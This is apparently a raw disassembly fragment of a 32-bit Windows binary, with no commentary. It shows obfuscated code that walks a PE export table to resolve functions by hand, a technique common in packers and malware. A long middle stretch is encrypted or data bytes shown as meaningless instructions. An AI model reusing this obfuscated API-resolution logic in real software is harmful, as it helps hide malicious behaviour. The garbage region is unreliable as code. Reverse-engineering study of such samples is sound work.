  40c40d:	je     0x40cc0f
  40c413:	sbb    DWORD PTR ds:0x43372f,0x13ee
  40c41d:	mov    eax,DWORD PTR [ebp-0x4]
  40c420:	adc    DWORD PTR ds:0x433723,0x47a9
  40c42a:	xor    eax,0x7510854
  40c42f:	sbb    DWORD PTR ds:0x4337e7,0x7bc1
  40c439:	add    eax,ebx
  40c43b:	cmp    edi,eax
  40c43d:	mov    DWORD PTR ds:0x4337f3,0x1580
  40c447:	jne    0x40c892
  40c44d:	push   DWORD PTR [ebp+0x8]
  40c450:	call   0x411718
  40c455:	mov    DWORD PTR [ebp-0x20],eax
  40c458:	adc    DWORD PTR ds:0x4337a7,edi
  40c45e:	mov    eax,DWORD PTR [ebp-0x4]
  40c461:	and    DWORD PTR ds:0x4337eb,0x0
  40c46b:	jmp    0x40c47f
  40c470:	xor    ecx,ecx
  40c472:	xor    ecx,DWORD PTR ds:0x4337eb
  40c478:	inc    ecx
  40c479:	mov    DWORD PTR ds:0x4337eb,ecx
  40c47f:	cmp    DWORD PTR ds:0x4337eb,0x1c
  40c486:	jae    0x40c4c3
  40c48c:	cmp    DWORD PTR ds:0x4337eb,0xb
  40c493:	jne    0x40c4a2
  40c499:	push   DWORD PTR [ebp-0x1c]
  40c49c:	call   DWORD PTR ds:0x4123a8
  40c4a2:	cmp    DWORD PTR ds:0x4337eb,0xa
  40c4a9:	jne    0x40c4be
  40c4af:	xor    ecx,ecx
  40c4b1:	xor    ecx,DWORD PTR ds:0x4337eb
  40c4b7:	inc    ecx
  40c4b8:	mov    DWORD PTR ds:0x4337eb,ecx
  40c4be:	jmp    0x40c470
  40c4c3:	mov    ecx,DWORD PTR [ebp-0x20]
  40c4c6:	xor    esi,esi
  40c4c8:	or     esi,DWORD PTR ds:0x4337eb
  40c4ce:	and    esi,DWORD PTR ds:0x4337ef
  40c4d4:	mov    DWORD PTR ds:0x4337eb,esi
  40c4da:	mov    esi,0x7510854
  40c4df:	sub    DWORD PTR ds:0x4337bb,0x5d26
  40c4e9:	xor    eax,esi
  40c4eb:	xor    DWORD PTR ds:0x433783,0xf10
  40c4f5:	add    eax,ebx
  40c4f7:	mov    DWORD PTR ds:0x43376f,0x5b3f
  40c501:	cmp    ecx,eax
  40c503:	je     0x40cbf3
  40c509:	and    DWORD PTR ds:0x4337fb,0x10b9
  40c513:	push   DWORD PTR [ebp-0x20]
  40c516:	push   DWORD PTR [ebp+0x8]
  40c519:	sub    DWORD PTR ds:0x4337eb,0x535e
  40c523:	call   0x40f400
  40c528:	sub    DWORD PTR ds:0x4337f3,edx
  40c52e:	mov    DWORD PTR [ebp-0x14],eax
  40c531:	mov    eax,DWORD PTR [ebp-0x4]
  40c534:	mov    ecx,DWORD PTR [ebp-0x14]
  40c537:	xor    eax,esi
  40c539:	add    eax,ebx
  40c53b:	cmp    ecx,eax
  40c53d:	je     0x40cbf3
  40c543:	mov    eax,DWORD PTR [ebp-0x14]
  40c546:	mov    eax,DWORD PTR [eax+0x18]
  40c549:	mov    DWORD PTR [ebp-0x20],eax
  40c54c:	mov    eax,DWORD PTR [ebp-0x14]
  40c54f:	mov    ecx,DWORD PTR [ebp+0x8]
  40c552:	add    ecx,DWORD PTR [eax+0x20]
  40c555:	mov    DWORD PTR [ebp-0x28],ecx
  40c558:	mov    eax,DWORD PTR [ebp-0x14]
  40c55b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c55e:	add    ecx,DWORD PTR [eax+0x24]
  40c561:	mov    DWORD PTR [ebp-0x2c],ecx
  40c564:	jmp    0x40c884
  40c569:	mov    ah,BYTE PTR [ecx+edx*8-0x548e0e10]
  40c570:	fs ret 
  40c572:	mov    ecx,0x960f5658
  40c577:	repnz iret 
  40c579:	sbb    BYTE PTR [ecx+0x7d7d7e7e],al
  40c57f:	jle    0x40c5ff
  40c581:	jl     0x40c5a0
  40c583:	xchg   ecx,eax
  40c584:	retf   
  40c585:	adc    BYTE PTR [ebx+ebx*1+0xd],dh
  40c589:	jmp    0xc410e66
  40c58e:	jl     0x40c5f6
  40c590:	clc    
  40c591:	cs ret 0xdf2b
  40c595:	jae    0x43d67d5f
  40c59b:	imul   ecx,DWORD PTR [eax-0x1717800c],0x1da2e87b
  40c5a5:	mov    ebp,ebx
  40c5a7:	dec    ebp
  40c5a8:	xchg   esp,eax
  40c5a9:	out    0xf5,al
  40c5ab:	sub    ebx,eax
  40c5ad:	inc    edx
  40c5ae:	pop    ebx
  40c5af:	fisubr WORD PTR [esi]
  40c5b1:	in     al,0x1d
  40c5b3:	jno    0x40c577
  40c5b5:	mov    edi,0x1087159b
  40c5ba:	test   BYTE PTR [ebx],bh
  40c5bc:	adc    DWORD PTR [ecx],edi
  40c5be:	data16 and BYTE PTR [eax-0x63],ch
  40c5c2:	and    BYTE PTR [ebp-0x35],ah
  40c5c5:	jle    0x40c5f8
  40c5c7:	ja     0x40c561
  40c5c9:	mov    al,0x4f
  40c5cb:	ins    DWORD PTR es:[edi],dx
  40c5cc:	and    ch,BYTE PTR [edx+0x36]
  40c5cf:	bound  esi,QWORD PTR [edi-0x44]
  40c5d2:	xchg   ebp,eax
  40c5d3:	mov    cl,0xfb
  40c5d5:	add    al,bl
  40c5d7:	sbb    DWORD PTR [edx],0xffffffee
  40c5da:	ja     0x40c5a9
  40c5dc:	adc    BYTE PTR [esi+0x32],ah
  40c5df:	icebp  
  40c5e0:	lock fcom DWORD PTR [eax+0x760af323]
  40c5e7:	mov    ?,esi
  40c5e9:	aaa    
  40c5ea:	or     ebp,DWORD PTR [edx+0xb516476]
  40c5f0:	and    edx,edi
  40c5f2:	imul   esp,DWORD PTR ds:0xec8c8395,0x63316df1
  40c5fc:	or     eax,0x5a0170ba
  40c601:	sub    al,0xe2
  40c603:	stos   BYTE PTR es:[edi],al
  40c604:	mov    esp,0xdbdd28f0
  40c609:	sbb    edi,DWORD PTR [ecx+0x68]
  40c60c:	and    WORD PTR [edi-0x1f03091c],0xffd8
  40c614:	arpl   WORD PTR [edi],bp
  40c616:	les    esp,FWORD PTR [eax]
  40c618:	scas   al,BYTE PTR es:[edi]
  40c619:	ret    0xd2aa
  40c61c:	jp     0x40c643
  40c61e:	in     al,0x55
  40c620:	lea    esi,[esi]
  40c622:	ds inc edi
  40c624:	in     al,dx
  40c625:	adc    BYTE PTR [eax-0x3],dh
  40c628:	cmp    ecx,DWORD PTR [ecx-0xbee954e]
  40c62e:	inc    ebp
  40c62f:	aas    
  40c630:	pusha  
  40c631:	stc    
  40c632:	stos   BYTE PTR es:[edi],al
  40c633:	or     BYTE PTR [ecx],al
  40c635:	rcl    BYTE PTR [ebx+0x2e7ac5c8],1
  40c63b:	leave  
  40c63c:	pop    ebp
  40c63d:	jecxz  0x40c61f
  40c63f:	je     0x40c66d
  40c641:	and    BYTE PTR [ecx+0x39779162],ah
  40c647:	lds    eax,FWORD PTR [edx+0x73b017be]
  40c64d:	cwde   
  40c64e:	add    al,0x42
  40c650:	cmp    esi,DWORD PTR [edx]
  40c652:	retf   0xc7e7
  40c655:	adc    eax,0xee7561bc
  40c65a:	(bad)  
  40c65b:	dec    ebp
  40c65c:	xchg   ebp,eax
  40c65d:	jae    0x40c614
  40c65f:	cdq    
  40c660:	call   0xdadfa1da
  40c665:	fnstcw WORD PTR [ecx-0x7167d59]
  40c66b:	stc    
  40c66c:	inc    ebp
  40c66d:	arpl   WORD PTR [esi+0x3f],bx
  40c670:	dec    ebp
  40c671:	shl    DWORD PTR [edx],0x7b
  40c674:	push   edi
  40c675:	out    0x9c,al
  40c677:	(bad)  
  40c678:	scas   eax,DWORD PTR es:[edi]
  40c679:	dec    esp
  40c67a:	popf   
  40c67b:	rcl    BYTE PTR [esi-0x32],1
  40c67e:	jl     0x40c6d0
  40c680:	scas   al,BYTE PTR es:[edi]
  40c681:	and    al,0x3e
  40c683:	inc    eax
  40c684:	jbe    0x40c60b
  40c686:	repz das 
  40c688:	xor    al,bh
  40c68a:	aam    0x17
  40c68c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c68d:	lahf   
  40c68e:	jbe    0x40c65d
  40c690:	iret   
  40c691:	xchg   edx,eax
  40c692:	rcl    bl,1
  40c694:	inc    eax
  40c695:	(bad)  
  40c696:	das    
  40c697:	cmp    DWORD PTR [ebp-0x62],ebx
  40c69a:	fcmovb st,st(0)
  40c69c:	shr    cl,cl
  40c69e:	mov    dh,0x69
  40c6a0:	add    DWORD PTR [ecx+0x11],eax
  40c6a3:	nop
  40c6a4:	cmp    BYTE PTR [ebp+0x20],ah
  40c6a7:	mov    al,0xd0
  40c6a9:	push   ebx
  40c6aa:	mov    cs,WORD PTR [esi+ebx*8]
  40c6ad:	call   0x669d8970
  40c6b2:	in     eax,dx
  40c6b3:	(bad)  
  40c6b4:	xchg   edx,eax
  40c6b5:	sbb    eax,0x2fd96624
  40c6ba:	sbb    dh,BYTE PTR [edi+eax*2-0x3b]
  40c6be:	or     BYTE PTR [ecx],dh
  40c6c0:	leave  
  40c6c1:	fldenv [eiz*1+0x5c214613]
  40c6c8:	mov    ds:0xca543d4e,al
  40c6cd:	mov    cl,0x52
  40c6cf:	(bad)  
  40c6d0:	shl    DWORD PTR [edi+0x4114cd6e],cl
  40c6d6:	inc    dh
  40c6d8:	jne    0x40c6f5
  40c6da:	fimul  WORD PTR [edi+0x2b3adb3]
  40c6e0:	mov    ch,0x3c
  40c6e2:	and    ebp,ecx
  40c6e4:	and    al,0xef
  40c6e6:	inc    ecx
  40c6e7:	sub    eax,0xfa2e6a96
  40c6ec:	data16 sub al,BYTE PTR [ebp-0x3f8e26c8]
  40c6f3:	ss scas eax,DWORD PTR es:[edi]
  40c6f5:	jecxz  0x40c755
  40c6f7:	xor    BYTE PTR [ecx-0x23],dh
  40c6fa:	jl     0x40c69e
  40c6fc:	repz add cl,ah
  40c6ff:	sub    dh,BYTE PTR [esi+0x5]
  40c702:	out    0x0,al
  40c704:	dec    ebp
  40c705:	call   0x63d8d89a
  40c70a:	out    dx,al
  40c70b:	loope  0x40c70e
  40c70d:	add    eax,0x310d0ed9
  40c712:	inc    eax
  40c713:	sbb    DWORD PTR [esi],ebx
  40c715:	jno    0x40c730
  40c717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c718:	hlt    
  40c719:	mov    ss,WORD PTR [eax+0x5]
  40c71c:	cmp    dl,bl
  40c71e:	push   ecx
  40c71f:	in     al,dx
  40c720:	jle    0x40c6fe
  40c722:	cld    
  40c723:	stos   DWORD PTR es:[edi],eax
  40c724:	leave  
  40c725:	(bad)  [eax]
  40c727:	test   bh,al
  40c729:	call   0x8946f269
  40c72e:	mov    esp,0x6efe361b
  40c733:	mov    ds:0xc7c3c20,al
  40c738:	fidiv  DWORD PTR [ecx-0x198c3dc]
  40c73e:	xor    DWORD PTR [ecx],ebp
  40c740:	inc    ebx
  40c741:	pop    ebp
  40c742:	enter  0xc555,0xca
  40c746:	xor    esi,edx
  40c748:	pop    ecx
  40c749:	vmovntdq YMMWORD PTR [edx+esi*8+0x56],ymm5
  40c74f:	js     0x40c6e3
  40c751:	out    0x53,al
  40c753:	shr    eax,0x94
  40c756:	jns    0x40c78f
  40c758:	pusha  
  40c759:	dec    edx
  40c75a:	sbb    ebp,esp
  40c75c:	sbb    BYTE PTR [edx+0x1e40de5f],ah
  40c762:	scas   eax,DWORD PTR es:[edi]
  40c763:	fsubr  DWORD PTR [ebx-0x41d5120c]
  40c769:	cdq    
  40c76a:	outs   dx,DWORD PTR ds:[esi]
  40c76b:	lds    esp,FWORD PTR [ebx]
  40c76d:	mov    al,0xe2
  40c76f:	sub    ebx,DWORD PTR [eax+0x4e094453]
  40c775:	lods   eax,DWORD PTR ds:[esi]
  40c776:	mov    al,0x0
  40c778:	ror    BYTE PTR [eax+ecx*8-0x26],cl
  40c77c:	in     eax,dx
  40c77d:	push   eax
  40c77e:	pop    ecx
  40c77f:	xor    bl,0xcd
  40c782:	es mov ecx,0x662a69c
  40c788:	sbb    ecx,0xffffffa0
  40c78b:	daa    
  40c78c:	pop    edx
  40c78d:	sub    eax,0x7a7815d
  40c792:	nop
  40c793:	sub    al,0xfc
  40c795:	cmp    al,0xc2
  40c797:	sbb    al,0xf
  40c799:	test   eax,0x82a4b698
  40c79e:	xchg   ecx,edi
  40c7a0:	dec    eax
  40c7a1:	fadd   DWORD PTR [ecx+0x18cbe91e]
  40c7a7:	(bad)  
  40c7a8:	hlt    
  40c7a9:	rcl    DWORD PTR ds:0x2aeebbe4,0x40
  40c7b0:	push   ebx
  40c7b1:	add    eax,0x45e2fbc6
  40c7b6:	test   DWORD PTR [esi],0x84f2792f
  40c7bc:	sti    
  40c7bd:	fmulp  st(6),st
  40c7bf:	cli    
  40c7c0:	dec    edx
  40c7c1:	mov    esp,0x47d95e70
  40c7c6:	ins    BYTE PTR es:[edi],dx
  40c7c7:	add    dh,dh
  40c7c9:	sub    edx,DWORD PTR [ecx-0x47]
  40c7cc:	sbb    BYTE PTR [ebx+0x4],al
  40c7cf:	inc    ecx
  40c7d0:	repnz mov BYTE PTR [eax],ch
  40c7d3:	jmp    0x40c841
  40c7d5:	mov    eax,0xf83adae7
  40c7da:	mov    cs,ebp
  40c7dc:	and    eax,0x169c829d
  40c7e1:	stos   DWORD PTR es:[edi],eax
  40c7e2:	loop   0x40c7bf
  40c7e4:	outs   dx,DWORD PTR ds:[esi]
  40c7e5:	(bad)  
  40c7e7:	sub    edx,DWORD PTR [ebx-0x4f]
  40c7ea:	enter  0xc488,0x56
  40c7ee:	icebp  
  40c7ef:	dec    ebp
  40c7f0:	ret    0xc9ea
  40c7f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7f4:	adc    BYTE PTR [ecx],cl
  40c7f6:	mov    edi,0x9736466b
  40c7fb:	je     0x40c7f4
  40c7fd:	add    ebp,ecx
  40c7ff:	pusha  
  40c800:	shl    BYTE PTR [ecx+eax*8+0x30],cl
  40c804:	jmp    0xdf4ce4ed
  40c809:	lahf   
  40c80a:	or     al,0xd7
  40c80c:	repnz push ecx
  40c80e:	in     eax,0xf2
  40c810:	call   DWORD PTR [edx+0x42fb5b78]
  40c816:	add    ebx,DWORD PTR ds:0x916543ff
  40c81c:	js     0x40c7ba
  40c81e:	cwde   
  40c81f:	popf   
  40c820:	cmp    BYTE PTR [ebp-0x18],al
  40c823:	pop    esp
  40c824:	js     0x40c82c
  40c826:	adc    eax,0x349110f0
  40c82b:	push   eax
  40c82c:	test   al,dl
  40c82e:	push   esi
  40c82f:	test   BYTE PTR [ecx],dh
  40c831:	pusha  
  40c832:	mul    DWORD PTR [edi+0x2738a1cf]
  40c838:	xchg   edx,eax
  40c839:	xor    cl,cl
  40c83b:	arpl   WORD PTR [eax-0x2d],dx
  40c83e:	gs shr bh,1
  40c841:	add    cl,BYTE PTR [eax+esi*1-0x7b8ab728]
  40c848:	out    dx,al
  40c849:	xor    al,0x7e
  40c84b:	inc    eax
  40c84c:	ins    BYTE PTR es:[edi],dx
  40c84d:	mov    edx,0xb683f015
  40c852:	and    BYTE PTR [ecx],cl
  40c854:	or     esp,DWORD PTR [ebx-0x54dd43a0]
  40c85a:	fcmovnbe st,st(1)
  40c85c:	fsub   st(1),st
  40c85e:	(bad)
  40c861:	(bad)  
  40c862:	js     0x40c877
  40c864:	mov    cl,0x18
  40c866:	fwait
  40c867:	int    0xe4
  40c869:	ds into 
  40c86b:	mov    esi,0xb23a8064
  40c870:	into   
  40c871:	fstp   TBYTE PTR [edx]
  40c873:	ds retf 0x1ab8
  40c877:	fwait
  40c878:	enter  0x980c,0x81
  40c87c:	popf   
  40c87d:	frstor ds:[ebx]
  40c880:	rol    BYTE PTR [ebp-0x6],cl
  40c883:	or     DWORD PTR [ebx+0x4d8bec45],0x8
  40c88a:	add    ecx,DWORD PTR [eax+0x1c]
  40c88d:	xor    esi,esi
  40c88f:	mov    DWORD PTR [ebp-0x14],ecx
  40c892:	mov    eax,DWORD PTR [ebp-0x28]
  40c895:	mov    ecx,DWORD PTR [ebp+0x8]
  40c898:	add    ecx,DWORD PTR [eax+edi*4]
  40c89b:	lea    eax,[ebp-0x8]
  40c89e:	mov    DWORD PTR [ebp-0x30],ecx
  40c8a1:	jmp    0x40cbc1
  40c8a6:	push   0xffffffa4
  40c8a8:	adc    ebx,DWORD PTR [ecx]
  40c8aa:	shr    DWORD PTR [ecx+0x51917570],1
  40c8b0:	cs fwait
  40c8b2:	push   ebp
  40c8b3:	es add eax,0x7e8c2796
  40c8b9:	jle    0x40c938
  40c8bb:	jge    0x40c93b
  40c8bd:	jle    0x40c8bc
  40c8bf:	ins    DWORD PTR es:[edi],dx
  40c8c0:	cmp    ebp,ecx
  40c8c2:	add    esi,edi
  40c8c4:	nop
  40c8c5:	adc    eax,0x42c88953
  40c8ca:	mov    ch,0xb3
  40c8cc:	inc    ebp
  40c8cd:	out    dx,al
  40c8ce:	xor    DWORD PTR [esi],ebp
  40c8d0:	or     al,0xc
  40c8d2:	mov    ah,ah
  40c8d4:	lea    ebx,[ebp-0x77be10]
  40c8da:	sbb    DWORD PTR [edi-0x217b1bbf],ecx
  40c8e0:	push   ecx
  40c8e1:	lods   eax,DWORD PTR ds:[esi]
  40c8e2:	mov    edi,0x6cab61c1
  40c8e7:	sub    eax,0xe4211e62
  40c8ec:	sub    eax,0xded59245
  40c8f1:	push   esi
  40c8f2:	adc    BYTE PTR [ecx],cl
  40c8f4:	popf   
  40c8f5:	(bad)
  40c8f8:	jmp    0x3397:0x18127ad8
  40c8ff:	popf   
  40c900:	push   esp
  40c901:	outs   dx,DWORD PTR ds:[esi]
  40c902:	mov    esi,0x7560d5f9
  40c907:	push   esi
  40c908:	push   ds
  40c909:	lea    edi,[ebx-0x65637c73]
  40c90f:	sub    BYTE PTR [ecx+0x9],dh
  40c912:	dec    BYTE PTR [edx]
  40c914:	ds xchg edx,ebx
  40c917:	stos   DWORD PTR es:[edi],eax
  40c918:	jo     0x40c8ea
  40c91a:	inc    edx
  40c91b:	or     eax,0x4a5141a7
  40c920:	cli    
  40c921:	fnsave [ecx]
  40c923:	or     al,0x71
  40c925:	ins    DWORD PTR es:[edi],dx
  40c926:	sbb    BYTE PTR es:[eax],bl
  40c929:	mov    dl,BYTE PTR [esp+eax*4-0x3e]
  40c92d:	mov    ds:0x422dbe5a,eax
  40c932:	mov    edx,0x6783da94
  40c937:	imul   esi,DWORD PTR [edi-0x47],0x88b95201
  40c93e:	leave  
  40c93f:	aaa    
  40c940:	xchg   ebx,eax
  40c941:	pop    esp
  40c942:	adc    al,0x30
  40c944:	mov    bh,0x63
  40c946:	call   0x8be3:0xb4a12dfe
  40c94d:	sbb    DWORD PTR [edi+0x37d4f0f4],esi
  40c953:	arpl   WORD PTR [eax-0x55],di
  40c956:	mov    WORD PTR [ecx],cs
  40c958:	std    
  40c959:	aad    0xef
  40c95b:	lea    ebp,[esi+ecx*2]
  40c95e:	pop    ebp
  40c95f:	adc    bl,BYTE PTR [esi-0x3ee07ea6]
  40c965:	cmp    dh,BYTE PTR [ebx-0x15]
  40c968:	rcr    DWORD PTR [edi+ebx*2-0x7cb77e8b],cl
  40c96f:	stc    
  40c970:	nop
  40c971:	push   esi
  40c972:	xchg   esi,eax
  40c973:	xchg   esi,eax
  40c974:	push   ds
  40c975:	sub    eax,0xfb3d66c5
  40c97a:	adc    DWORD PTR [eax+0x430bec8f],esp
  40c980:	sahf   
  40c981:	ds das 
  40c983:	leave  
  40c984:	gs mov dh,0x19
  40c987:	sbb    BYTE PTR [edx-0x127622be],dh
  40c98d:	adc    al,BYTE PTR [ebx-0x12]
  40c990:	sub    BYTE PTR [ebx-0x12359270],ah
  40c996:	nop
  40c997:	ins    DWORD PTR es:[edi],dx
  40c998:	or     eax,DWORD PTR [eax+ecx*4-0x32]
  40c99c:	xchg   esp,eax
  40c99d:	fsub   QWORD PTR [edx+0x10]
  40c9a0:	mov    ecx,0xe14f20d8
  40c9a5:	mov    BYTE PTR [esi-0x94cab8e],dl
  40c9ab:	lea    edi,[ebx-0x6be951f6]
  40c9b1:	imul   ecx,DWORD PTR [ebx],0xf795d07a
  40c9b7:	jae    0x40ca1d
  40c9b9:	inc    edi
  40c9ba:	xlat   BYTE PTR ds:[ebx]
  40c9bb:	imul   esp,DWORD PTR [edx+0x39],0x77750560
  40c9c2:	adc    edx,esp
  40c9c4:	repz cmc 
  40c9c6:	cmp    eax,0xa39977bb
  40c9cb:	xchg   esi,eax
  40c9cc:	stos   BYTE PTR es:[edi],al
  40c9cd:	call   FWORD PTR [eax+0x5c8408cd]
  40c9d3:	push   ds
  40c9d4:	outs   dx,DWORD PTR ds:[esi]
  40c9d5:	mov    bh,0xfa
  40c9d7:	add    BYTE PTR [esi+0x2d91f953],ch
  40c9dd:	sub    bl,cl
  40c9df:	scas   eax,DWORD PTR es:[edi]
  40c9e0:	lock pusha 
  40c9e2:	and    al,BYTE PTR [edx+0x110bda96]
  40c9e8:	repnz mov bh,BYTE PTR [ecx]
  40c9eb:	inc    eax
  40c9ec:	js     0x40c9ab
  40c9ee:	int    0xd9
  40c9f0:	jns    0x40ca5d
  40c9f2:	xor    eax,0x99e15b5a
  40c9f7:	inc    ebp
  40c9f8:	mov    cl,0x55
  40c9fa:	cmp    eax,0x87636e0f
  40c9ff:	cmc    
  40ca00:	xchg   esi,eax
  40ca01:	push   ebp
  40ca02:	lea    ebp,[esi-0xd0f2ea7]
  40ca08:	cmp    BYTE PTR [esi],cl
  40ca0a:	push   edi
  40ca0b:	pop    es
  40ca0c:	inc    ebp
  40ca0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca0e:	sbb    ah,bh
  40ca10:	loopne 0x40ca8e
  40ca12:	in     eax,0x34
  40ca14:	fisttp QWORD PTR [ebx]
  40ca16:	push   ecx
  40ca17:	gs push ebp
  40ca19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca1a:	add    bl,BYTE PTR [edi+edi*8]
  40ca1d:	jne    0x40c9c1
  40ca1f:	jns    0x40ca55
  40ca21:	imul   ebp,DWORD PTR [esi*1+0x7b574947],0xffffffde
  40ca29:	out    dx,al
  40ca2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca2b:	mov    edx,0x44affbb7
  40ca30:	(bad)  
  40ca31:	push   ds
  40ca32:	fcomp  st(7)
  40ca34:	push   ss
  40ca35:	shl    BYTE PTR [eax-0x23b4d14c],1
  40ca3b:	(bad)  
  40ca3c:	jo     0x40ca2d
  40ca3e:	and    eax,0xa19a648c
  40ca43:	retf   0x564a
  40ca46:	push   cs
  40ca47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca48:	mov    ch,0x5a
  40ca4a:	repz ds cmp edi,edi
  40ca4e:	add    eax,0xd5d5702c
  40ca53:	mov    cl,0xa0
  40ca55:	push   ecx
  40ca56:	jno    0x40ca0a
  40ca58:	icebp  
  40ca59:	pop    edi
  40ca5a:	mov    BYTE PTR [eax],bh
  40ca5c:	jmp    0xeb1c:0x77fce400
  40ca63:	pop    eax
  40ca64:	shl    esi,0x5f
  40ca67:	add    ah,BYTE PTR [edx-0x1c]
  40ca6a:	and    eax,0xbd8bc212
  40ca6f:	sar    BYTE PTR [ebx],cl
  40ca71:	imul   eax,DWORD PTR [ecx],0x3a
  40ca74:	lock jp 0x40cacd
  40ca77:	inc    ebx
  40ca78:	lds    edi,FWORD PTR [ecx]
  40ca7a:	inc    esp
  40ca7b:	jo     0x40ca0e
  40ca7d:	dec    esi
  40ca7f:	(bad)  
  40ca80:	jo     0x40ca37
  40ca82:	cmp    al,0x8
  40ca84:	push   0x8
  40ca86:	mov    ah,0xa8
  40ca88:	adc    ecx,DWORD PTR [eax]
  40ca8a:	shl    BYTE PTR [ecx-0x4dfb038d],cl
  40ca90:	inc    esp
  40ca91:	push   edi
  40ca92:	push   cs
  40ca93:	sub    eax,DWORD PTR [ecx-0x79]
  40ca96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca97:	jg     0x40cb04
  40ca99:	(bad)  
  40ca9a:	jp     0x40cb0e
  40ca9c:	mov    ebx,DWORD PTR [edx-0x8af5d03]
  40caa2:	mov    ebx,DWORD PTR [ecx-0x461ae5d]
  40caa8:	or     DWORD PTR [edi],esp
  40caaa:	aam    0xa6
  40caac:	ins    BYTE PTR es:[edi],dx
  40caad:	retf   0xbb6f
  40cab0:	icebp  
  40cab1:	add    eax,DWORD PTR [ebp+0x5d]
  40cab4:	clc    
  40cab5:	aam    0x2d
  40cab7:	xchg   ebx,eax
  40cab8:	imul   edx
  40caba:	scas   eax,DWORD PTR es:[edi]
  40cabb:	fldenv [ecx-0x37d6441c]
  40cac1:	or     dl,bh
  40cac3:	mov    esp,0xc021b9a1
  40cac8:	push   ebx
  40cac9:	or     cl,0xe5
  40cacc:	push   edx
  40cacd:	ins    DWORD PTR es:[edi],dx
  40cace:	sbb    edi,esp
  40cad0:	mov    ch,0x5d
  40cad2:	sbb    DWORD PTR [ebp-0x895b59a],ebx
  40cad8:	mov    eax,0x525a194
  40cadd:	fwait
  40cade:	data16 mov BYTE PTR [ebp-0x37],0x2
  40cae3:	xlat   BYTE PTR ds:[ebx]
  40cae4:	rcl    bh,1
  40cae6:	xor    al,0x75
  40cae8:	test   DWORD PTR [eax],eax
  40caea:	xchg   ebx,eax
  40caeb:	cmp    BYTE PTR [esi],bh
  40caed:	and    eax,0xb39e582a
  40caf2:	out    dx,eax
  40caf3:	inc    edx
  40caf4:	xor    ah,BYTE PTR ds:0x6f3da52c
  40cafa:	and    dh,BYTE PTR [eax-0x7d]
  40cafd:	xor    eax,0x3306a99d
  40cb02:	mov    BYTE PTR [eax+0x7530e533],al
  40cb08:	push   edi
  40cb09:	or     DWORD PTR [edx],ebx
  40cb0b:	scas   eax,DWORD PTR es:[edi]
  40cb0c:	sbb    ah,dh
  40cb0e:	lods   eax,DWORD PTR ds:[esi]
  40cb0f:	(bad)  ds:0x21c2dbd4
  40cb15:	mov    dh,0x8d
  40cb17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb18:	scas   eax,DWORD PTR es:[edi]
  40cb19:	sub    DWORD PTR [eax+0xb6a5ba6],ecx
  40cb1f:	fnsave [eax]
  40cb21:	cmp    bl,BYTE PTR [edx+0x78]
  40cb24:	sbb    BYTE PTR [ecx+0x22a87914],bl
  40cb2a:	inc    eax
  40cb2b:	xor    ah,bh
  40cb2d:	add    BYTE PTR [eax],cl
  40cb2f:	retf   
  40cb30:	adc    ah,ah
  40cb32:	mov    al,ds:0xb15f8acc
  40cb37:	imul   ebp,DWORD PTR [ebp+0xe],0xfffffff1
  40cb3b:	arpl   WORD PTR [ebx],ax
  40cb3d:	pop    esp
  40cb3e:	and    al,0x11
  40cb40:	stos   DWORD PTR es:[edi],eax
  40cb41:	das    
  40cb42:	push   eax
  40cb43:	push   cs
  40cb44:	ds ins DWORD PTR es:[edi],dx
  40cb46:	jne    0x40cbb4
  40cb48:	cli    
  40cb49:	pop    esp
  40cb4a:	lods   al,BYTE PTR ds:[esi]
  40cb4b:	nop
  40cb4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb4d:	push   ebp
  40cb4e:	(bad)  
  40cb4f:	pop    edx
  40cb50:	xchg   ebp,eax
  40cb51:	fld    DWORD PTR [eax]
  40cb53:	jmp    0xb75abeb1
  40cb58:	cmc    
  40cb59:	clc    
  40cb5a:	xor    BYTE PTR [edi-0x60],ah
  40cb5d:	into   
  40cb5e:	mov    eax,0x2d0973f
  40cb63:	or     bl,BYTE PTR [esi+0xe]
  40cb66:	xlat   BYTE PTR ds:[ebx]
  40cb67:	push   0x59
  40cb69:	loop   0x40cb67
  40cb6b:	ror    BYTE PTR [edi+0x64],cl
  40cb6e:	repz xchg esi,eax
  40cb70:	cmp    dh,BYTE PTR [edx+ebx*1-0x80]
  40cb74:	inc    ecx
  40cb75:	(bad)  
  40cb77:	add    eax,0xa1c3081d
  40cb7c:	xchg   ebp,eax
  40cb7d:	sahf   
  40cb7e:	inc    ebp
  40cb7f:	in     eax,dx
  40cb80:	adc    DWORD PTR [ecx+0x45],esi
  40cb83:	mov    WORD PTR [ecx+0x665d5c29],cs
  40cb89:	inc    edx
  40cb8a:	sub    eax,0xad06f34f
  40cb8f:	mov    ?,WORD PTR [ebp+0x70417a07]
  40cb95:	adc    DWORD PTR [edx],eax
  40cb97:	pusha  
  40cb98:	sbb    ah,BYTE PTR [eax+esi*8]
  40cb9b:	out    0x64,al
  40cb9d:	mov    eax,ds:0xb06070e8
  40cba2:	outs   dx,BYTE PTR ds:[esi]
  40cba3:	mov    dh,0xa7
  40cba5:	inc    eax
  40cba6:	jne    0x40cc08
  40cba8:	dec    edi
  40cba9:	(bad)  
  40cbaa:	scas   al,BYTE PTR es:[edi]
  40cbab:	imul   edi,DWORD PTR [edi],0x3
  40cbae:	das    
  40cbaf:	shl    DWORD PTR [ebp+ebp*4+0x1c],cl
  40cbb3:	xor    BYTE PTR [edx-0x65],al
  40cbb6:	inc    edx
  40cbb7:	and    eax,0x9969e905
  40cbbc:	ja     0x40cc10
  40cbbe:	add    edi,DWORD PTR [ebx]
  40cbc0:	movmskps edi,xmm7
  40cbc3:	jne    0x40cb95
  40cbc5:	push   DWORD PTR [ebp+0xc]
  40cbc8:	call   0x410a7f
  40cbcd:	mov    eax,DWORD PTR [ebp-0x4]
  40cbd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbd3:	xor    eax,0x7510854
  40cbd8:	add    eax,ebx
  40cbda:	cmp    ecx,eax
  40cbdc:	jne    0x40cbff
